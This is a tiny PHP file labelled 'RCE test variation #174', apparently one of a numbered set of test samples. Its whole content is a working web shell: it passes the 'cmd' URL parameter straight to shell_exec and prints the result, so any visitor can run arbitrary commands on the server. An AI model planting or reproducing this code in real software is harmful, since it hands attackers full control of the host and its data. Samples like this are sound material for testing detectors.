<?php
// RCE test variation #174
$cmd = $_GET['cmd'] ?? 'ls';
echo shell_exec($cmd);
?>